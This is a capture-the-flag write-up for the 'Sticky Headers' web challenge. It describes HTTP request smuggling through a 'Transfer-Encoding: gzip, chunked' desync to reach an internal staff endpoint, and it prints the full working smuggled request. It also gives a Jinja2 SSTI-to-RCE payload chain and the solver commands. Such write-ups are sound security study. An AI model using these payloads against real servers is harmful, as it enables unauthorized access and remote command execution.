# Sticky Headers - HTTP request smuggling + Jinja2 SSTI

- **Platform:** FortiD CTF 2026
- **Category:** Web
- **Author:** (not recorded in the workspace)
- **Points / Solves:** (not recorded in the workspace)
- **Date:** 2026-10-13
- **Remote:** `nc <host> 1337` (the platform gives an instance)
- **Flag:** `FortID{...}` (masked)
- **Artifact:** no source was given - only a live instance

## What the task is

A candy shop site with two roles:

- public `POST /order` - places an "order" with a `message` field, replies `Order received!`;
- internal `POST /staff/preview` - renders a template from the `message` field, but a direct request returns **403**.

The hint in the description - *"Older couriers may describe delivery contents using more than one encoding"* - together with the title **Sticky Headers** points to classic **HTTP request smuggling** through a composite `Transfer-Encoding`.

## The solution in two steps

**1. Smuggling.** With the headers `X-Client-Version: 1` and `Transfer-Encoding: gzip, chunked` on the first `/order` request, the front proxy and the internal service parse the body differently, and a **second** request is processed on the same connection - this time to `/staff/preview` (it returns `200`). The working request is captured byte-for-byte in `evidence/smuggle_working_070.request` (that is probe #070):

```text
POST /order HTTP/1.1
Host: <host>
X-Client-Version: 1
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Transfer-Encoding: gzip, chunked

B
order=hello
0

POST /staff/preview HTTP/1.1
Host: <host>
Connection: keep-alive
X-Client-Version: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

message=%7B%7B7%2A7%7D%7D
```

`B` is the chunk size 0xB = 11 = the length of `order=hello`. The reply (two HTTP responses on one connection, the second is the staff page with the render result) is next to it in `evidence/smuggle_working_070.response`: `preview">49`.

**2. SSTI - RCE.** The staff renderer is Jinja2, `{{7*7}}` gives `49`. The standard chain:

```text
{{cycler.__init__.__globals__.os.popen("<CMD>").read()}}
```

`find / -name recipe.txt` finds `/opt/candy/recipe.txt` (a symlink to `/tmp/recipe.txt`), `cat` on that path returns the flag.

The full analysis is in [`solve.md`](solve.md).

## Folder structure

```text
web/sticky-headers/
├── README.md          # this file: the task context
├── solve.md           # the solution: analysis, pitfalls, flag
├── scripts/
│   ├── solve.py                  # the final client: smuggling + SSTI (host [port] / --expr / --cmd)
│   ├── sticky_staff_inspector.py # brute-forcing SSTI expressions and collecting confirmations
│   ├── sticky_headers_desync.py  # checking the TE-header desync
│   └── sticky_headers_v1_probe.py# brute-forcing X-Client-Version / TE variants (found #070)
└── evidence/
    ├── smuggle_working_070.request   # the working request, byte-for-byte
    ├── smuggle_working_070.response  # two responses, the second preview=49
    ├── staff_inspector_summary.json  # the table of confirmed SSTI expressions
    ├── staff_inspector_000.request
    └── staff_inspector_000.response
```

## Reproduction

The instance is closed after the event, so a live run is currently impossible. The script is parameterized and ready for any live instance:

```bash
python3 scripts/solve.py <host> 1337        # control {{7*7}} -> find -> cat -> flag
python3 scripts/solve.py <host> --expr '{{7*7}}'
python3 scripts/solve.py <host> --cmd 'id'
```

Verified offline: `build_request(host, '{{7*7}}')` is identical to `evidence/smuggle_working_070.request` up to the line-ending style (the script uses CRLF, the evidence was saved with LF) - the request content is the exact one that gave `preview">49` on the live server.